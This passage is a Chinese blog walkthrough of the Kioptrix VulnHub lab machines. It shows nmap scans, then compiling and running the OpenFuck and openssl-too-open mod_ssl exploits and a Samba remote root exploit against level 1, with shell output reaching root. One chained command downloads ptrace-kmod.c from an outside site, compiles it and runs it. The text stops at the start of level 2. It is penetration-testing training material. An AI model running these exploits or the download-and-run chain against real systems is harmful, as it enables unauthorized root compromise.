<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>
    vulnhub-Kioptrix系列-wp | 道萝岗特森&#39;s Blog
  </title>
  <meta name="description" content="hello world">
  
  <meta name="keywords" content="
  vulnhub靶机
  ">
  
  <meta name="author" content="daolgts">

  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="theme-color" content="#1e2327">
  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">

  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  

  
<script>
  var _hmt = _hmt || [];
  (function(){var hm = document.createElement("script");
    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
</script>


  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
</head>

<body id="replica-app">

<nav class="navbar-wrapper">
  <div class="navbar">
    <div class="container clearfix">
      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>

      <div class="navbar-search float-left desktop-only">
        <div class="navbar-search-form">
          <label for="gsc-i-id1">This website</label>
          <div id="google-search">
            <gcse:search></gcse:search>
          </div>
        </div>
      </div>

      <ul class="navbar-nav float-left">
        
        <li><a href="/archives">Archives</a></li>
        
        <!--  -->
        
        <li><a href="/tags">Tags</a></li>
        
        
          <li><a href="/links">Links</a></li>
        
        
          <li><a href="/about">About</a></li>
        
        
      </ul>

      <ul class="navbar-nav user-nav float-right desktop-only">
        <li class="user-nav-notification">
          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
        </li>
        <li>
          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
        </li>
        <li class="user-nav-logo">
          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
        </li>
      </ul>
    </div>
  </div>
</nav>

<div class="main-container">
  <header class="header-wrapper desktop-only">
  <div class="container header-site-detail">
    <ul class="header-toolbar">
      <li class="clearfix">
        <a href="/archives" class="header-toolbar-left"><i
                  class="fa fa-file-text"></i> Posts </a>
        <a href="/archives"
           class="header-toolbar-right"> 35 </a>
      </li>
      <li>
        <a href="/tags" class="header-toolbar-left"><i
                  class="fa fa-tags"></i> Tags </a>
        <a href="/tags"
           class="header-toolbar-right"> 15 </a>
      </li>
      <li>
        <a href="/categories" class="header-toolbar-left"><i
                  class="fa fa-folder-open"></i> Categories </a>
        <a href="/categories"
           class="header-toolbar-right"> 0 </a>
      </li>
    </ul>
    <h2 class="header-title">
      <i class="fa fa-book text-muted"></i>
      <a href="/">道萝岗特森&#39;s Blog</a>
      
      
    </h2>
  </div>

  <div class="container">
    <div class="header-tab-wrapper clearfix">
      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
    </div>
  </div>
</header>


<div class="post-container container">
  <h3>
    <i class="fa fa-user-o"></i>
    daolgts

    <span class="post-date float-right" title="{{moment(1547879400000).format('MMM DD, YYYY, h:mm:ss A')}}">
      <i class="fa fa-pencil-square-o"></i>
      {{moment(1547879400000).fromNow()}}
    </span>
  </h3>

  <article class="post-content">
    <h1>vulnhub-Kioptrix系列-wp</h1>
    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>vulhub上提供了许多靶机，供安全爱好者学习渗透测试使用，是很好的用来入门渗透测试的环境</p>
<p>Kioptrix系列有多个靶机，每一个靶机都能有不同的姿势来进行渗透</p>
<h1 id="Kioptrix-1"><a href="#Kioptrix-1" class="headerlink" title="Kioptrix#1"></a>Kioptrix#1</h1><p>下载地址:<a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a></p>
<ul>
<li>靶机ip 192.168.214.136</li>
<li>kali ip 192.168.214.135</li>
</ul>
<h2 id="openssl漏洞"><a href="#openssl漏洞" class="headerlink" title="openssl漏洞"></a>openssl漏洞</h2><p>先上nmap扫</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.70 scan initiated Fri Sep 28 21:38:59 2018 as: nmap -sS -A -oN /root/Desktop/kioptrix1.txt 192.168.214.136</span><br><span class="line">Nmap scan report for 192.168.214.136</span><br><span class="line">Host is up (0.015s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</span><br><span class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</span><br><span class="line">|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100024  1           1024/tcp  status</span><br><span class="line">|_  100024  1           1024/udp  status</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: mMYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">|_ssl-date: 2018-09-29T01:41:08+00:00; +1m52s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|_    SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:43:1E:F2 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4</span><br><span class="line">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1m51s, deviation: 0s, median: 1m51s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line">1   14.76 ms 192.168.214.136</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Fri Sep 28 21:43:26 2018 -- 1 IP address (1 host up) scanned in 267.95 seconds</span><br></pre></td></tr></table></figure>

<p>打开主页，是apache的测试页面，用dirb扫目录能扫出来一些但都没有什么用</p>
<p>通过nmap，能发现</p>
<ol>
<li>Apache/1.3.20</li>
<li>mod_ssl/2.8.4 OpenSSL/0.9.6b</li>
<li>139端口的Samba服务</li>
<li>Linux 2.4.X Red-Hat/Linux</li>
</ol>
<p>searchsploit查一下apache的exp，发现下面几条好像能用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;OpenFuck.c&apos; Remote Buffer Overflow                                                 | exploits/unix/remote/21671.c</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;OpenFuckV2.c&apos; Remote Buffer Overflow                                               | exploits/unix/remote/764.c</span><br><span class="line">Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - &apos;openssl-too-open.c&apos; SSL2 KEY_ARG Overflow                         | exploits/unix/remote/40347.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/unix/remote/764.c ~/Desktop/764.c</span><br></pre></td></tr></table></figure>

<p>按照给出的编译命令并不能正常编译，不过也给出了update的操作</p>
<p><a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/" target="_blank" rel="noopener">http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/</a></p>
<p>按照他给的操作，不过另外还要安装<code>apt-get install libssl1.0-dev</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">gcc -o OpenFuck 764.c -lcrypto</span><br><span class="line"></span><br><span class="line">root@kali:~/Desktop# ./OpenFuck 0x6a 192.168.214.136</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* #hackarena  irc.brasnet.org                                     *</span><br><span class="line">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80fc4e8</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">Good Bye!</span><br><span class="line">root@kali:~/Desktop# ./OpenFuck 0x6b 192.168.214.136</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* #hackarena  irc.brasnet.org                                     *</span><br><span class="line">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80fc4e8</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- </span><br><span class="line">--22:36:29--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&apos;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:80... connected!</span><br><span class="line">HTTP request sent, awaiting response... 301 Moved Permanently</span><br><span class="line">Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]</span><br><span class="line">--22:36:30--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&apos;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:443... connected!</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3,921 [text/x-csrc]</span><br><span class="line"></span><br><span class="line">    0K ...                                                   100% @   3.74 MB/s</span><br><span class="line"></span><br><span class="line">22:36:31 (3.74 MB/s) - `ptrace-kmod.c&apos; saved [3921/3921]</span><br><span class="line"></span><br><span class="line">[+] Attached to 7390</span><br><span class="line">[+] Signal caught</span><br><span class="line">[+] Shellcode placed at 0x4001189d</span><br><span class="line">[+] Now wait for suid shell...</span><br><span class="line">ls</span><br><span class="line">p</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>拿到shell直接就是root权限了</p>
<p>还有第三个exp也可以用，<code>openssl-too-open</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/40347.tar.gz</span><br><span class="line"></span><br><span class="line">tar -xzvf 40347.tar.gz</span><br></pre></td></tr></table></figure>

<p>直接make有问题，查了下也没找到解决方法，看报错是<code>ssl2.c</code>里的问题，想到上一个exp里修改的，加了<code>#include &lt;openssl/x509.h&gt;</code> <code>#include &lt;openssl/evp.h&gt;</code>这两个头文件，然后就能成功make了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/openssl-too-open# ./openssl-too-open </span><br><span class="line">: openssl-too-open : OpenSSL remote exploit</span><br><span class="line">  by Solar Eclipse &lt;solareclipse@phreedom.org&gt;</span><br><span class="line"></span><br><span class="line">Usage: ./openssl-too-open [options] &lt;host&gt;</span><br><span class="line">  -a &lt;arch&gt;          target architecture (default is 0x00)</span><br><span class="line">  -p &lt;port&gt;          SSL port (default is 443)</span><br><span class="line">  -c &lt;N&gt;             open N apache connections before sending the shellcode (default is 30)</span><br><span class="line">  -m &lt;N&gt;             maximum number of open connections (default is 50)</span><br><span class="line">  -v                 verbose mode</span><br><span class="line"></span><br><span class="line">Supported architectures:</span><br><span class="line">	0x00 - Gentoo (apache-1.3.24-r2)</span><br><span class="line">	0x01 - Debian Woody GNU/Linux 3.0 (apache-1.3.26-1)</span><br><span class="line">	0x02 - Slackware 7.0 (apache-1.3.26)</span><br><span class="line">	0x03 - Slackware 8.1-stable (apache-1.3.26)</span><br><span class="line">	0x04 - RedHat Linux 6.0 (apache-1.3.6-7)</span><br><span class="line">	0x05 - RedHat Linux 6.1 (apache-1.3.9-4)</span><br><span class="line">	0x06 - RedHat Linux 6.2 (apache-1.3.12-2)</span><br><span class="line">	0x07 - RedHat Linux 7.0 (apache-1.3.12-25)</span><br><span class="line">	0x08 - RedHat Linux 7.1 (apache-1.3.19-5)</span><br><span class="line">	0x09 - RedHat Linux 7.2 (apache-1.3.20-16)</span><br><span class="line">	0x0a - Redhat Linux 7.2 (apache-1.3.26 w/PHP)</span><br><span class="line">	0x0b - RedHat Linux 7.3 (apache-1.3.23-11)</span><br><span class="line">	0x0c - SuSE Linux 7.0 (apache-1.3.12)</span><br><span class="line">	0x0d - SuSE Linux 7.1 (apache-1.3.17)</span><br><span class="line">	0x0e - SuSE Linux 7.2 (apache-1.3.19)</span><br><span class="line">	0x0f - SuSE Linux 7.3 (apache-1.3.20)</span><br><span class="line">	0x10 - SuSE Linux 8.0 (apache-1.3.23-137)</span><br><span class="line">	0x11 - SuSE Linux 8.0 (apache-1.3.23)</span><br><span class="line">	0x12 - Mandrake Linux 7.1 (apache-1.3.14-2)</span><br><span class="line">	0x13 - Mandrake Linux 8.0 (apache-1.3.19-3)</span><br><span class="line">	0x14 - Mandrake Linux 8.1 (apache-1.3.20-3)</span><br><span class="line">	0x15 - Mandrake Linux 8.2 (apache-1.3.23-4)</span><br><span class="line"></span><br><span class="line">Examples: ./openssl-too-open -a 0x01 -v localhost</span><br><span class="line">          ./openssl-too-open -p 1234 192.168.0.1 -c 40 -m 80</span><br><span class="line"></span><br><span class="line">root@kali:~/Desktop/openssl-too-open# ./openssl-too-open -a 0x09 192.168.214.136</span><br><span class="line">: openssl-too-open : OpenSSL remote exploit</span><br><span class="line">  by Solar Eclipse &lt;solareclipse@phreedom.org&gt;</span><br><span class="line"></span><br><span class="line">: Opening 30 connections</span><br><span class="line">  Establishing SSL connections</span><br><span class="line"></span><br><span class="line">: Using the OpenSSL info leak to retrieve the addresses</span><br><span class="line">  ssl0 : 0x80f8050</span><br><span class="line">  ssl1 : 0x80f8050</span><br><span class="line">  ssl2 : 0x80f8050</span><br><span class="line"></span><br><span class="line">: Sending shellcode</span><br><span class="line">ciphers: 0x80f8050   start_addr: 0x80f7f90   SHELLCODE_OFS: 208</span><br><span class="line">  Execution of stage1 shellcode succeeded, sending stage2</span><br><span class="line">  Spawning shell...</span><br><span class="line"></span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">bash-2.05$ uname -a; id; w;</span><br><span class="line">Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br><span class="line"> 11:11pm  up  2:25,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT</span><br><span class="line">bash-2.05$ </span><br><span class="line">bash-2.05$ ls</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd</span><br><span class="line">lib</span><br><span class="line">lost+found</span><br><span class="line">misc</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">sbin</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">bash-2.05$ id</span><br><span class="line">id</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br><span class="line">bash-2.05$</span><br></pre></td></tr></table></figure>

<p>但用这个exp是apache权限</p>
<h2 id="samba漏洞"><a href="#samba漏洞" class="headerlink" title="samba漏洞"></a>samba漏洞</h2><p>拿maf的<code>smb_version</code>扫描版本，发现是2.2.1a</p>
<p><code>searchsploit samba</code>看看有没有能用的漏洞</p>
<p>发现有一条<br><code>Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                                                                    | exploits/multiple/remote/10.c</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cp /usr/share/exploitdb/exploits/multiple/remote/10.c ~/Desktop/10.c</span><br><span class="line">root@kali:~# cd Desktop/</span><br><span class="line">root@kali:~/Desktop# gcc 10.c -o fucksamba</span><br><span class="line">root@kali:~/Desktop# chmod +x fucksamba </span><br><span class="line">root@kali:~/Desktop# ./fucksamba </span><br><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">Usage: ./fucksamba [-bBcCdfprsStv] [host]</span><br><span class="line"></span><br><span class="line">-b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)</span><br><span class="line">-B &lt;step&gt;       bruteforce steps (default = 300)</span><br><span class="line">-c &lt;ip address&gt; connectback ip address</span><br><span class="line">-C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)</span><br><span class="line">-d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)</span><br><span class="line">-f              force</span><br><span class="line">-p &lt;port&gt;       port to attack (default = 139)</span><br><span class="line">-r &lt;ret&gt;        return address</span><br><span class="line">-s              scan mode (random)</span><br><span class="line">-S &lt;network&gt;    scan mode</span><br><span class="line">-t &lt;type&gt;       presets (0 for a list)</span><br><span class="line">-v              verbose mode</span><br><span class="line">root@kali:~/Desktop# ./fucksamba -b 0 -v 192.168.214.136</span><br><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">+ Verbose mode.</span><br><span class="line">+ Bruteforce mode. (Linux)</span><br><span class="line">+ Host is running samba.</span><br><span class="line">+ Using ret: [0xbffffed4]</span><br><span class="line">+ Using ret: [0xbffffda8]</span><br><span class="line">+ Using ret: [0xbffffc7c]</span><br><span class="line">+ Using ret: [0xbffffb50]</span><br><span class="line">+ Worked!</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">*** JE MOET JE MUIL HOUWE</span><br><span class="line">Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span><br><span class="line">uid=0(root) gid=0(root) groups=99(nobody)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>这样得到的也是root权限</p>
<h1 id="Kioptrix-2"><a href="#Kioptrix-2" class="headerlink" title="Kioptrix#2"></a>Kioptrix#2</h1><p>下载地址: <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a></p>
<ul>
<li>靶机ip 192.168.214.138</li>
<li>kali ip 192.168.214.139</li>
</ul>
<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 